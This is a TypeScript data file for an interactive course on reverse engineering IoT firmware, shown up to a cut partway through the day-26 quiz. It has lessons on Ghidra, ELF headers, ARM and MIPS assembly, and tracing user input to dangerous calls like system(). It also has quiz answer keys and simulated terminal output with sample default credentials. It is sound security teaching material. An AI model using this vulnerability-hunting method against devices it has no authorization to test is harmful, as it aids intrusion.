import { DayData } from "@/lib/types";

export const week4: DayData[] = [
  {
    day: 22,
    title: "What Is Reverse Engineering? — Reading Code That Wasn't Meant to Be Read",
    hook: "In 2018, a security researcher at Cisco Talos downloaded a firmware update for a popular smart home hub. The manufacturer claimed their latest patch 'fixed all known security issues.' There was no source code, no documentation, no changelog explaining what changed. So the researcher loaded the binary into Ghidra, the NSA's reverse engineering tool that had just been open-sourced, and decompiled the patched function side-by-side with the original. What she found was alarming: the 'fix' didn't remove the backdoor — it just moved it to a different function and renamed the variables. Without reverse engineering, no one would have known. The manufacturer's word was all anyone had. RE is the ability to read code that was never meant to be read. It transforms a pile of machine instructions into understandable logic, letting you verify claims, find hidden functionality, and discover vulnerabilities that source code review would have caught — if source code existed. Today you'll learn what reverse engineering actually means, what tools exist, and why it's the most important skill for finding bugs in embedded firmware.",
    lesson: [
      "Reverse engineering is the process of analyzing compiled software to understand what it does, without having the original source code. When a developer writes a program in C, the compiler translates it into machine code — raw CPU instructions specific to an architecture (x86, ARM, MIPS). Reverse engineering works backward: it takes those machine instructions and reconstructs the logic, data flow, and behavior of the program.",
      "There are two main representations: disassembly and decompilation. Disassembly translates machine code byte-by-byte into assembly instructions — the human-readable form of CPU instructions like 'MOV R0, #5' or 'LDR R1, [R0]'. This is accurate but hard to read. Decompilation goes further: it analyzes the assembly patterns and attempts to reconstruct higher-level C-like code. Decompiled code isn't identical to the original source, but it's close enough to understand the logic.",
      "The main tools: Ghidra (NSA, free and open-source) is the industry standard for firmware RE. It handles MIPS, ARM, x86, PowerPC, and more. It provides both disassembly and decompilation views. IDA Pro (Hex-Rays, expensive but powerful) was the gold standard for decades. Binary Ninja is a modern alternative with a great API. For quick analysis, 'objdump -d' provides basic disassembly, and 'strings' extracts readable text from binaries.",
      "In IoT firmware research, reverse engineering answers critical questions: What does this binary do? Does it contain hardcoded credentials? Is the authentication logic sound? Does user input reach dangerous functions like system() or strcpy()? Where does the binary store encryption keys? RE turns opaque firmware blobs into transparent, auditable code. It's the difference between trusting a manufacturer's word and verifying it yourself."
    ],
    exercise: {
      type: "choice",
      prompt: "A firmware binary has been compiled from C source code into MIPS machine code. You load it into Ghidra and see two views: one showing 'addiu $sp, $sp, -0x28' and another showing 'void handle_request(char *input) { ... }'. What is the difference between these two views?",
      choices: [
        "Both are the same — Ghidra just formats them differently",
        "The first is disassembly (raw CPU instructions); the second is decompilation (reconstructed C-like code). Disassembly is exact; decompilation is an approximation",
        "The first is the original source code; the second is Ghidra's interpretation",
        "The first is ARM assembly; the second is MIPS assembly"
      ],
      validator: (input: string) => {
        const choice = input.trim().toUpperCase();
        if (choice === "B") {
          return { correct: true, hint: "Correct! Disassembly is a direct translation of machine code to assembly instructions — it's exact. Decompilation analyzes those instructions and tries to reconstruct C-like pseudocode. The decompiled view is an approximation (variable names, types, and some logic may differ from the original), but it's much easier to read and reason about." };
        }
        if (choice === "A") {
          return { correct: false, hint: "These are fundamentally different representations. Assembly instructions like 'addiu $sp, $sp, -0x28' operate at the CPU level, while C-like code like 'void handle_request(...)' is a higher-level reconstruction." };
        }
        if (choice === "C") {
          return { correct: false, hint: "Neither is the original source code. The assembly is derived from machine code, and the C-like view is Ghidra's best attempt at reconstructing the original logic — but it's not the actual source." };
        }
        if (choice === "D") {
          return { correct: false, hint: "'addiu $sp, $sp, -0x28' is MIPS assembly (addiu is a MIPS instruction). The C-like view isn't assembly at all — it's decompiled pseudocode." };
        }
        return { correct: false, hint: "Choose A, B, C, or D." };
      },
    },
    quiz: {
      question: "What is the primary purpose of decompilation in firmware reverse engineering?",
      options: [
        { label: "A", value: "To recover the exact original source code written by the developer" },
        { label: "B", value: "To reconstruct approximate C-like code from machine instructions, making the binary's logic easier to understand and audit" },
        { label: "C", value: "To compile the binary for a different CPU architecture" },
        { label: "D", value: "To encrypt the binary so attackers cannot read it" },
      ],
      correct: "B",
      explanation: "Decompilation reconstructs an approximation of the original source code from compiled machine instructions. It can't recover exact variable names, comments, or all original syntax, but it produces readable C-like pseudocode that reveals the binary's logic, control flow, and data handling. This makes it far easier to find vulnerabilities than reading raw assembly.",
    },
    output: "Today you learned what reverse engineering is, the difference between disassembly and decompilation, and why RE is essential for auditing embedded firmware without source code.",
    homework: [
      {
        title: "Reverse Engineering IoT Firmware: Where to Start",
        url: "https://www.apriorit.com/dev-blog/reverse-reverse-engineer-iot-firmware",
        description: "A structured guide for beginners covering the RE workflow: from obtaining firmware to analyzing binaries in Ghidra."
      },
      {
        title: "Reverse IoT Devices",
        url: "https://gitbook.seguranca-informatica.pt/arm/reverse-iot-devices",
        description: "Hands-on guide to reverse engineering ARM-based IoT devices, including practical Ghidra examples."
      }
    ],
  },
  {
    day: 23,
    title: "Binary Formats — ELF, Raw Firmware, and Architecture Detection",
    hook: "You've extracted a firmware filesystem and found a binary called 'management_daemon' in /usr/sbin/. You need to load it into Ghidra, but Ghidra needs to know: what CPU architecture? What endianness? What base address? If you get any of these wrong, Ghidra will produce garbage — disassembling ARM code as MIPS, or reading big-endian data as little-endian. Every instruction will be wrong. Before you can reverse engineer anything, you need to identify exactly what you're looking at. Today you'll learn to read binary format headers, detect architectures from raw bytes, and prepare any binary — ELF executable or raw firmware blob — for analysis in Ghidra. This is the prerequisite step that separates productive RE sessions from hours of wasted time staring at wrong disassembly.",
    lesson: [
      "ELF (Executable and Linkable Format) is the standard binary format on Linux, including embedded Linux devices. An ELF file has a structured header that tells you everything: architecture (ARM, MIPS, x86), endianness (little or big), entry point address, section layout, and linked libraries. The 'file' command reads this header: 'file httpd' might output 'ELF 32-bit MSB executable, MIPS'. The 'readelf -h' command shows the full header in detail.",
      "Raw firmware is harder. Not everything in a firmware image is a neat ELF file. Bootloaders, bare-metal code, and some RTOS binaries are raw instruction streams with no header at all. You get a blob of bytes with no metadata. For these, you need to detect the architecture by examining the instruction patterns. The tool cpu_rec uses statistical analysis to identify the CPU architecture from raw binary data — it recognizes instruction patterns for ARM, MIPS, PowerPC, x86, and dozens more.",
      "The 'objdump' tool provides quick disassembly without a full RE tool: 'objdump -d httpd' disassembles the .text section showing all the code. 'objdump -x httpd' shows headers, sections, and symbols. For a quick overview of what functions exist, 'objdump -t httpd | grep FUNC' lists all function symbols — though stripped binaries (which most firmware uses) won't have meaningful names.",
      "When loading a raw binary into Ghidra, you'll need to specify: the processor (e.g., MIPS:BE:32:default for big-endian 32-bit MIPS), the base address (where the code expects to be loaded in memory — often 0x80000000 for MIPS kernel code or 0x00400000 for user-space programs), and the entry point. Getting these right is critical. Hints come from strings in the binary (memory addresses in error messages), the bootloader (U-Boot logs mention load addresses), and known conventions for each architecture."
    ],
    exercise: {
      type: "terminal",
      prompt: "Identify binary formats and architectures for reverse engineering:\n• file squashfs-root/usr/sbin/management_daemon\n• readelf -h squashfs-root/usr/sbin/management_daemon\n• objdump -d squashfs-root/usr/sbin/management_daemon | head -30\n• file bootloader.bin\n• python3 cpu_rec.py bootloader.bin\n• hexdump -C bootloader.bin | head -5\n• readelf -S squashfs-root/usr/sbin/management_daemon",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        file: (args: string) => {
          if (args.includes("management_daemon")) return "squashfs-root/usr/sbin/management_daemon: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=a1b2c3d4e5, stripped";
          if (args.includes("bootloader")) return "bootloader.bin: data";
          if (args.includes("httpd")) return "squashfs-root/usr/bin/httpd: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, stripped";
          if (args.includes("busybox")) return "squashfs-root/bin/busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1, statically linked, stripped";
          return `${args}: No such file or directory`;
        },
        readelf: (args: string) => {
          if (args.includes("-h") && args.includes("management")) return "ELF Header:\n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00\n  Class:                             ELF32\n  Data:                              2's complement, little endian\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  Type:                              EXEC (Executable file)\n  Machine:                           ARM\n  Version:                           0x1\n  Entry point address:               0x00010A60\n  Start of program headers:          52 (bytes into file)\n  Start of section headers:          68432 (bytes into file)\n  Flags:                             0x5000400, Version5 EABI, hard-float ABI\n  Size of this header:               52 (bytes)\n  Size of program headers:           32\n  Number of program headers:         9\n  Size of section headers:           40\n  Number of section headers:         28";
          if (args.includes("-S") && args.includes("management")) return "Section Headers:\n  [Nr] Name              Type         Addr     Off    Size   ES Flg\n  [ 0]                   NULL         00000000 000000 000000 00\n  [ 1] .interp           PROGBITS     00010154 000154 000019 00   A\n  [ 2] .note.gnu.build-id NOTE        00010170 000170 000024 00   A\n  [ 3] .hash             HASH         00010194 000194 0001a4 04   A\n  [ 4] .dynsym           DYNSYM       00010338 000338 000420 10   A\n  [ 5] .dynstr           STRTAB       00010758 000758 000289 00   A\n  [ 6] .text             PROGBITS     00010a60 000a60 00a430 00  AX\n  [ 7] .rodata           PROGBITS     0001ae90 00ae90 001820 00   A\n  [ 8] .data             PROGBITS     0002c6b0 00b6b0 000120 00  WA\n  [ 9] .bss              NOBITS       0002c7d0 00b7d0 000840 00  WA\n  [10] .got              PROGBITS     0002cfe8 00bfe8 000118 04  WA";
          return `readelf: Error: No such file: ${args}`;
        },
        objdump: (args: string) => {
          if (args.includes("-d") && args.includes("management")) return "squashfs-root/usr/sbin/management_daemon:     file format elf32-littlearm\n\nDisassembly of section .text:\n\n00010a60 <_start>:\n   10a60: e3a0b000    mov   fp, #0\n   10a64: e3a0e000    mov   lr, #0\n   10a68: e49d1004    pop   {r1}\n   10a6c: e1a0200d    mov   r2, sp\n   10a70: e52d2004    push  {r2}\n   10a74: e52d0004    push  {r0}\n   10a78: e59fc010    ldr   ip, [pc, #16]\n   10a7c: e52dc004    push  {ip}\n   10a80: e59f000c    ldr   r0, [pc, #12]\n   10a84: e59f300c    ldr   r3, [pc, #12]\n   10a88: eb000542    bl    11f98 <__libc_start_main>\n\n00010a8c <main>:\n   10a8c: e92d4800    push  {fp, lr}\n   10a90: e28db004    add   fp, sp, #4\n   10a94: e24dd010    sub   sp, sp, #16\n   10a98: e59f0084    ldr   r0, =0x1ae90\n   10a9c: eb000234    bl    11374 <puts>\n   10aa0: e59f0080    ldr   r0, =0x1aea4";
          if (args.includes("-t")) return "SYMBOL TABLE:\nno symbols (stripped binary)";
          return `objdump: ${args}: error`;
        },
        python3: (args: string) => {
          if (args.includes("cpu_rec") && args.includes("bootloader")) return "cpu_rec v2.0 - CPU Architecture Detection\n\nAnalyzing: bootloader.bin (262144 bytes)\n\nResults:\n  Architecture:  ARM (Thumb/ARM mixed)\n  Endianness:    Little Endian\n  Word Size:     32-bit\n  Confidence:    94.7%\n\n  Secondary match: ARM Cortex-M (89.2%)\n\n  Instruction frequency analysis:\n    PUSH/POP patterns: 23.4% (typical ARM)\n    BL/BLX branches:   18.7%\n    LDR/STR memory:    31.2%\n    MOV/ADD/SUB:       26.7%\n\n  Suggested Ghidra settings:\n    Processor: ARM:LE:32:v7\n    Base Address: 0x08000000 (typical for Cortex-M)\n    Entry Point: 0x08000004 (reset vector)";
          return "python3: No such script";
        },
        hexdump: (args: string) => {
          if (args.includes("bootloader")) return "00000000  00 40 00 20 c1 00 00 08  d9 00 00 08 db 00 00 08  |.@. ............|\n00000010  dd 00 00 08 df 00 00 08  e1 00 00 08 00 00 00 00  |................|\n00000020  00 00 00 00 00 00 00 00  00 00 00 00 e3 00 00 08  |................|\n00000030  e5 00 00 08 00 00 00 00  e7 00 00 08 e9 00 00 08  |................|\n00000040  eb 00 00 08 ed 00 00 08  ef 00 00 08 f1 00 00 08  |................|";
          return `hexdump: ${args}: No such file`;
        },
        strings: (args: string) => {
          if (args.includes("bootloader")) return "U-Boot 2019.07\nCPU: ARM Cortex-A9\nDRAM: 256 MiB\nLoading kernel from 0x80800000\nmmc0: card detected\nHit any key to stop autoboot";
          return `strings: ${args}: No such file`;
        },
        help: () => "Available commands: file, readelf, objdump, python3, hexdump, strings, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "You find a binary file with no ELF header — just raw bytes. The 'file' command says 'data'. What is the best approach to determine its CPU architecture?",
      options: [
        { label: "A", value: "Rename it to .exe and open it in Windows" },
        { label: "B", value: "Use cpu_rec for statistical architecture detection, check for strings mentioning the CPU, and examine byte patterns in a hex editor" },
        { label: "C", value: "It's impossible to analyze raw binaries without an ELF header" },
        { label: "D", value: "Run 'readelf -h' — it works on any binary format" },
      ],
      correct: "B",
      explanation: "For raw binaries without headers, use multiple techniques: cpu_rec analyzes instruction byte patterns statistically to identify the architecture. 'strings' might reveal CPU model names, compiler info, or boot messages. Hex patterns can also hint at architecture — for example, ARM Cortex-M binaries start with a vector table. readelf only works on ELF files, not raw blobs.",
    },
    output: "Today you learned to identify binary formats (ELF vs raw), detect CPU architectures using file, readelf, cpu_rec, and hexdump, and prepare binaries for Ghidra analysis.",
    homework: [
      {
        title: "Reversing Raw Binary Firmware Files in Ghidra",
        url: "https://gist.github.com/nstarke/ed0aba2c882b8b3078747a567ee00520",
        description: "Step-by-step guide to loading raw firmware blobs into Ghidra with correct architecture, base address, and entry point settings."
      },
      {
        title: "cpu_rec: Identify CPU Architecture from Binary",
        url: "https://github.com/airbus-seclab/cpu_rec",
        description: "Airbus's statistical CPU architecture detection tool — feed it any binary and it identifies the instruction set."
      },
      {
        title: "Disassembling Cortex-M Raw Binary with Ghidra",
        url: "https://web.archive.org/web/2024/https://blog.feabhas.com/2022/12/disassembling-a-cortex-m-raw-binary-file-with-ghidra/",
        description: "Practical guide to loading and analyzing ARM Cortex-M raw firmware in Ghidra, including vector table identification."
      }
    ],
  },
  {
    day: 24,
    title: "ARM Assembly — The Language of IoT",
    hook: "ARM processors power over 95% of smartphones and a massive share of IoT devices — smart cameras, doorbells, wearables, industrial sensors, and medical devices. When you open a firmware binary in Ghidra and look at the disassembly view, you'll see ARM assembly instructions. They look intimidating at first: 'LDR R0, [R1, #0x10]' or 'BL 0x00010A60'. But each instruction does something simple — move a value, load from memory, compare two numbers, jump to a function. There are only about 30 instructions you need to know to read most embedded firmware. Today you'll learn the core ARM instructions that appear in almost every IoT binary. By the end, you'll be able to read a Ghidra disassembly listing and understand what the code is doing, instruction by instruction. This is the language your smart devices speak.",
    lesson: [
      "ARM assembly uses a load-store architecture: data must be loaded from memory into registers before operations, and results must be stored back to memory. ARM has 16 general-purpose registers (R0-R15). R0-R3 hold function arguments and return values. R13 (SP) is the stack pointer. R14 (LR) holds the return address. R15 (PC) is the program counter — the address of the next instruction.",
      "Data movement instructions: 'MOV R0, #5' puts the value 5 into register R0. 'LDR R1, [R0]' loads a value from the memory address stored in R0 into R1. 'STR R2, [R0]' stores the value in R2 to the memory address in R0. 'LDR R0, [SP, #0x10]' loads from the stack at offset 0x10 — this is how local variables are accessed.",
      "Control flow: 'BL 0x10A60' is 'Branch and Link' — it calls a function at address 0x10A60, saving the return address in LR. 'BX LR' returns from a function by jumping back to the saved return address. 'CMP R0, #0' compares R0 with zero, setting condition flags. 'BNE 0x10B00' branches to 0x10B00 if the previous comparison was 'not equal'. 'BEQ' branches if equal. These comparison-and-branch pairs form every if/else and loop in the code.",
      "In firmware RE, you'll see patterns: function prologues ('PUSH {R4-R7, LR}' — save registers before doing work), function epilogues ('POP {R4-R7, PC}' — restore registers and return), string loading ('LDR R0, =0x1AE90' followed by 'BL puts' — loading a string address and calling print), and dangerous calls ('LDR R0, [SP, #0x10]' followed by 'BL system' — loading user input and calling system()). Recognizing these patterns lets you quickly find interesting code in large binaries."
    ],
    exercise: {
      type: "input",
      prompt: "Look at this ARM assembly instruction:\n\n  LDR R0, [R1, #0x10]\n\nWhat does this instruction do? Describe it in plain English.\n(Hint: LDR stands for 'Load Register', R0 is the destination, R1 holds a base address, #0x10 is an offset)",
      placeholder: "Describe what the instruction does...",
      validator: (input: string) => {
        const lower = input.toLowerCase();
        if ((lower.includes("load") || lower.includes("read")) && (lower.includes("memory") || lower.includes("address") || lower.includes("r1")) && (lower.includes("r0") || lower.includes("register"))) {
          return { correct: true, hint: "Correct! LDR R0, [R1, #0x10] loads a value from memory at the address (R1 + 0x10) and stores it into register R0. This is how ARM accesses data structures — R1 points to the base of a struct, and #0x10 is the offset to a specific field. For example, if R1 points to a user object, offset 0x10 might be the password field." };
        }
        if (lower.includes("load") || lower.includes("ldr")) {
          return { correct: false, hint: "You're on the right track with 'load'. Be more specific: what is being loaded, from where, and into which register? Think of [R1, #0x10] as a memory address calculated from R1 plus an offset of 0x10." };
        }
        if (lower.includes("store") || lower.includes("write") || lower.includes("save")) {
          return { correct: false, hint: "LDR is Load, not Store. It reads FROM memory INTO a register. STR would be the opposite (store from register to memory). What does LDR R0, [R1, #0x10] read, and where does it put the result?" };
        }
        return { correct: false, hint: "LDR means Load Register. The instruction reads a value from memory and puts it into a register. [R1, #0x10] specifies the memory address: the value in R1 plus offset 0x10. R0 is where the loaded value goes." };
      },
    },
    quiz: {
      question: "You see this ARM assembly sequence in a decompiled function:\n\n  LDR R0, [SP, #0x10]\n  BL  system\n\nWhat does this code do, and why is it a security concern?",
      options: [
        { label: "A", value: "It loads a value from the stack and calls system() — if the stack value is user-controlled, this is command injection" },
        { label: "B", value: "It stores a return value and exits the function safely" },
        { label: "C", value: "It performs a mathematical calculation using the system clock" },
        { label: "D", value: "It compares two strings and checks the system status" },
      ],
      correct: "A",
      explanation: "LDR R0, [SP, #0x10] loads a value from the stack (offset 0x10) into R0 — the register that holds the first function argument on ARM. BL system then calls system() with that value as the command string. If the value at SP+0x10 is user-controlled input (e.g., from a web form), an attacker can inject arbitrary shell commands. This is the ARM assembly pattern for command injection.",
    },
    output: "Today you learned core ARM assembly instructions — MOV, LDR, STR, BL, CMP, BNE — and how to recognize dangerous patterns like user input flowing to system() calls.",
    homework: [
      {
        title: "Azeria Labs — ARM Assembly & Exploitation",
        url: "https://azeria-labs.com/",
        description: "The best free resource for learning ARM assembly and exploitation — interactive tutorials from basic instructions to advanced exploitation techniques."
      },
      {
        title: "A Noob's Guide to ARM Exploitation",
        url: "https://ad2001.gitbook.io/a-noobs-guide-to-arm-exploitation/",
        description: "Beginner-friendly guide walking through ARM assembly, stack operations, and buffer overflow exploitation step by step."
      }
    ],
  },
  {
    day: 25,
    title: "MIPS Assembly — The Language of Routers",
    hook: "While ARM dominates phones and IoT sensors, MIPS is the architecture behind millions of home routers, cable modems, and network equipment. TP-Link, Netgear, D-Link, Linksys — their consumer routers overwhelmingly use MIPS processors. When Pwn2Own contestants target routers, they're reading MIPS assembly. When CVE disclosures reference 'a stack-based buffer overflow in the httpd service,' the exploit was developed by analyzing MIPS instructions. MIPS is simpler than ARM in some ways — fixed 32-bit instruction width, predictable register conventions, straightforward branching. But it has a quirk that catches beginners: the branch delay slot. After every branch instruction, the CPU executes the next instruction regardless of whether the branch is taken. It's a hardware optimization that makes disassembly confusing until you know about it. Today you'll learn the MIPS instructions that appear in router firmware, and you'll never look at a Ghidra MIPS listing with confusion again.",
    lesson: [
      "MIPS has 32 general-purpose registers, each 32 bits wide. They have names that indicate their conventional use: $a0-$a3 hold function arguments (first four), $v0-$v1 hold return values, $sp is the stack pointer, $ra is the return address (like ARM's LR), $t0-$t9 are temporary registers, and $s0-$s7 are saved registers (preserved across function calls). $zero always holds the value 0.",
      "Key data instructions: 'addiu $sp, $sp, -0x28' subtracts 0x28 from the stack pointer — this is a function prologue allocating stack space. 'lw $a0, 0x10($sp)' loads a word from stack offset 0x10 into $a0 (load word — MIPS equivalent of ARM's LDR). 'sw $ra, 0x24($sp)' saves the return address to the stack — essential for function calls. 'li $v0, 1' loads the immediate value 1 into $v0 (the return value register).",
      "Control flow: 'jal 0x00408F00' is Jump And Link — it calls a function, saving the return address in $ra. 'jr $ra' returns from a function by jumping to the address in $ra. 'beq $a0, $zero, 0x00400C10' branches to address 0x00400C10 if $a0 equals zero. 'bne' is the opposite — branch if not equal. The critical MIPS quirk: the instruction after a branch (the 'delay slot') is always executed, even if the branch is taken.",
      "In router firmware RE, you'll see these patterns repeatedly: function entry ('addiu $sp, $sp, -0x28' then 'sw $ra, 0x24($sp)'), function exit ('lw $ra, 0x24($sp)' then 'jr $ra' then 'addiu $sp, $sp, 0x28' in the delay slot), string operations ('lw $a0, str_address' then 'jal strcmp'), and dangerous calls ('lw $a0, 0x10($sp)' then 'jal system' — loading user input and calling system). Understanding these patterns lets you trace data flow from user input to dangerous functions."
    ],
    exercise: {
      type: "input",
      prompt: "Look at this MIPS assembly code from a router binary:\n\n  lw    $a0, 0x10($sp)\n  jal   system\n  nop\n\nThe 'nop' after 'jal' is in the branch delay slot. What does this code sequence do, and which register holds the argument to system()?\n(Name the register, e.g., $a0, $v0, $sp)",
      placeholder: "Type the register name...",
      validator: (input: string) => {
        const clean = input.trim().toLowerCase().replace(/\s+/g, "");
        if (clean === "$a0" || clean === "a0" || clean === "$a0register" || clean.includes("a0")) {
          return { correct: true, hint: "Correct! $a0 holds the first function argument in the MIPS calling convention. 'lw $a0, 0x10($sp)' loads a value from the stack into $a0, and 'jal system' calls system() with that value as the command string. The 'nop' in the delay slot means nothing else happens between the branch and the function call. If the value at $sp+0x10 comes from user input, this is command injection." };
        }
        if (clean === "$v0" || clean === "v0") {
          return { correct: false, hint: "$v0 holds return values, not arguments. On MIPS, the first four function arguments go in $a0-$a3. Which register is being loaded with 'lw' before the 'jal system' call?" };
        }
        if (clean === "$sp" || clean === "sp") {
          return { correct: false, hint: "$sp is the stack pointer — it holds the address of the stack, not the argument itself. Look at which register the 'lw' instruction is loading the value INTO." };
        }
        return { correct: false, hint: "Look at the 'lw' instruction: 'lw $a0, 0x10($sp)'. The first operand after 'lw' is the destination register — the register that receives the loaded value. That register then becomes the argument to system()." };
      },
    },
    quiz: {
      question: "What is the MIPS 'branch delay slot,' and why does it matter for reverse engineering?",
      options: [
        { label: "A", value: "It's a bug in MIPS processors that causes random instruction skipping" },
        { label: "B", value: "The instruction immediately after a branch is always executed, regardless of whether the branch is taken — a hardware optimization that affects how you read disassembly" },
        { label: "C", value: "It's a security feature that prevents buffer overflows by delaying execution" },
        { label: "D", value: "It only exists in MIPS64, not MIPS32" },
      ],
      correct: "B",
      explanation: "The branch delay slot is a MIPS pipeline optimization: when the CPU encounters a branch instruction, it has already fetched the next instruction, so it executes it regardless of the branch outcome. In disassembly, you'll often see 'nop' in the delay slot (doing nothing), but sometimes compilers put useful instructions there. If you ignore the delay slot while reading MIPS assembly, you'll misunderstand the execution order.",
    },
    output: "Today you learned MIPS assembly fundamentals — registers, load/store instructions, branch patterns, and the delay slot — preparing you to reverse engineer router firmware in Ghidra.",
    homework: [
      {
        title: "MIPS Assembly Programming",
        url: "https://www.robertwinkler.com/projects/mips_book/mips_book.pdf",
        description: "Comprehensive free textbook covering MIPS architecture from basics to advanced topics, with practical examples."
      },
      {
        title: "MIPS Assembly Wikibook",
        url: "https://en.wikibooks.org/wiki/MIPS_Assembly",
        description: "Community-maintained reference covering MIPS instructions, conventions, and programming patterns."
      }
    ],
  },
  {
    day: 26,
    title: "Finding Vulnerabilities in Decompiled Code",
    hook: "In 2023, a researcher at Star Labs identified 17 vulnerabilities across four major router brands in a single month. His method wasn't fuzzing. It wasn't dynamic analysis. He used Ghidra to decompile the httpd binaries, then searched the decompiled code for calls to dangerous functions: system(), popen(), strcpy(), sprintf(), gets(). Each one is a potential vulnerability. system() and popen() can lead to command injection. strcpy() and sprintf() can cause buffer overflows. gets() should never be used — it has no length limit. He then traced backward from each dangerous call to see if user-controlled input could reach it. When it could, he had a vulnerability. This methodology — find dangerous sinks, trace inputs to sinks — is called taint analysis, and it's the most systematic way to find bugs in firmware. Today you'll learn to use strings and grep as first-pass tools to locate these dangerous patterns in firmware binaries.",
    lesson: [
      "The concept of 'sinks' and 'sources' is central to vulnerability hunting. A source is where user-controlled data enters the program: HTTP parameters, form fields, cookies, environment variables like QUERY_STRING. A sink is a dangerous function that, if reached by unsanitized user input, creates a vulnerability. Your job is to find paths from sources to sinks.",
      "Critical sinks in firmware: system() and popen() execute shell commands — if user input reaches them, it's command injection. strcpy(), strcat(), and sprintf() copy data without length checks — if the source is larger than the destination buffer, it's a buffer overflow. gets() reads input with no size limit — it's always vulnerable. memcpy() with a user-controlled length parameter can overflow buffers.",
      "The 'strings' command is your rapid-fire first pass. Run 'strings binary | grep -i system' to check if the binary uses system(). 'strings binary | grep -iE \"(system|popen|strcpy|sprintf|gets)\"' checks for all dangerous functions at once. If these strings appear, the binary imports or references these functions — worth deeper analysis in Ghidra.",
      "Beyond individual functions, look for patterns: hardcoded format strings with %s (potential format string vulnerabilities), password comparison strings (hardcoded credentials), shell command templates like '/bin/sh -c %s' (command injection), and file paths like '/etc/shadow' or '/dev/mtdblock' (sensitive file access). The combination of strings analysis and dangerous function identification lets you prioritize which binaries to analyze deeply in Ghidra and which to skip."
    ],
    exercise: {
      type: "terminal",
      prompt: "Hunt for dangerous functions in firmware binaries:\n• strings squashfs-root/usr/bin/httpd | grep -iE \"(system|popen|strcpy|sprintf|gets)\"\n• strings squashfs-root/www/cgi-bin/diagnostic.cgi | grep -i system\n• strings squashfs-root/usr/sbin/management_daemon | grep -iE \"(strcpy|sprintf|memcpy)\"\n• grep -rl \"system\" squashfs-root/www/cgi-bin/\n• strings squashfs-root/usr/bin/httpd | grep -E \"(%s|/bin/sh)\"\n• objdump -d squashfs-root/www/cgi-bin/diagnostic.cgi | grep -A2 \"system\"",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        strings: (args: string) => {
          if (args.includes("httpd") && (args.includes("system") || args.includes("popen") || args.includes("strcpy") || args.includes("sprintf"))) return "system\npopen\nstrcpy\nsprintf\n\n[ANALYSIS] httpd imports 4 dangerous functions:\n  - system(): 3 call sites found\n  - popen(): 1 call site found\n  - strcpy(): 12 call sites found (HIGH RISK — no bounds checking)\n  - sprintf(): 8 call sites found (potential buffer overflow)";
          if (args.includes("diagnostic") && args.includes("system")) return "system\n/bin/ping -c 4 %s\n/bin/sh -c %s\nQUERY_STRING\n\n[ANALYSIS] diagnostic.cgi uses system() with format strings:\n  - \"/bin/ping -c 4 %s\" — %s likely filled with user input\n  - \"/bin/sh -c %s\" — direct shell execution with user input\n  - References QUERY_STRING — an HTTP input source";
          if (args.includes("management") && (args.includes("strcpy") || args.includes("sprintf") || args.includes("memcpy"))) return "strcpy\nsprintf\nmemcpy\nsscanf\n\n[ANALYSIS] management_daemon has multiple unsafe memory operations:\n  - strcpy(): 7 call sites (no length check)\n  - sprintf(): 15 call sites (no bounds check)\n  - memcpy(): 4 call sites (check if length is user-controlled)\n  - sscanf(): 3 call sites (check format string parsing)";
          if (args.includes("httpd") && (args.includes("%s") || args.includes("/bin/sh"))) return "/bin/sh -c %s\nping -c 4 %s\ntraceroute %s\n/usr/sbin/iptables -A INPUT -s %s -j DROP\nsprintf(cmd_buf, \"/bin/ping -c 4 %s\", user_input)\n\n[ANALYSIS] Multiple format strings with %s found:\n  - Shell command templates accepting string input\n  - IP-address related operations without validation\n  - iptables rule creation with user-supplied source IP";
          return `strings: No results for ${args}`;
        },
        grep: (args: string) => {
          if (args.includes("-rl") && args.includes("system") && args.includes("cgi-bin")) return "squashfs-root/www/cgi-bin/diagnostic.cgi\nsquashfs-root/www/cgi-bin/apply.cgi\nsquashfs-root/www/cgi-bin/firmware_update.cgi\n\n[ANALYSIS] 3 out of 5 CGI binaries reference system():\n  - diagnostic.cgi — likely ping/traceroute functionality\n  - apply.cgi — likely configuration application\n  - firmware_update.cgi — likely firmware flash operations\n\nPrioritize these for Ghidra analysis.";
          if (args.includes("password") || args.includes("passwd")) return "squashfs-root/etc/config/httpd.conf:admin_password=admin123\nsquashfs-root/www/config.js:var DEFAULT_PASS='admin';";
          return "No matches found.";
        },
        objdump: (args: string) => {
          if (args.includes("diagnostic") && args.includes("system")) return "   400b88: 8fa40010    lw    $a0, 0x10($sp)     # Load user input from stack\n   400b8c: 0c100234    jal   0x004008d0         # Call system()\n   400b90: 00000000    nop                       # Delay slot\n--\n   400c44: 8fa40018    lw    $a0, 0x18($sp)     # Load another user input\n   400c48: 0c100234    jal   0x004008d0         # Call system() again\n   400c4c: 00000000    nop\n\n[ANALYSIS] Two system() call sites found at 0x400b8c and 0x400c48\nBoth load arguments directly from the stack — trace $sp offsets to\ndetermine if these values originate from user-controlled HTTP input.";
          return `objdump: ${args}: No such file`;
        },
        find: (args: string) => {
          if (args.includes("cgi")) return "squashfs-root/www/cgi-bin/diagnostic.cgi\nsquashfs-root/www/cgi-bin/login.cgi\nsquashfs-root/www/cgi-bin/apply.cgi\nsquashfs-root/www/cgi-bin/firmware_update.cgi\nsquashfs-root/www/cgi-bin/reboot.cgi";
          return "No results.";
        },
        ls: (args: string) => {
          if (args.includes("cgi-bin")) return "diagnostic.cgi  login.cgi  apply.cgi  firmware_update.cgi  reboot.cgi";
          return "squashfs-root/";
        },
        help: () => "Available commands: strings, grep, objdump, find, ls, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "You find that a CGI binary calls system() and references the QUERY_STRING environment variable. Using sink-and-source analysis, what can you conclude?",
      options: [
        { label: "A", value: "The binary is safe because QUERY_STRING is an internal variable" },
        { label: "B", value: "QUERY_STRING is a source (user HTTP input) and system() is a sink (shell execution) — if they're connected without sanitization, it's command injection" },
        { label: "C", value: "system() is safe as long as the binary runs as a non-root user" },
        { label: "D", value: "QUERY_STRING only contains encrypted data and can't be exploited" },
      ],
      correct: "B",
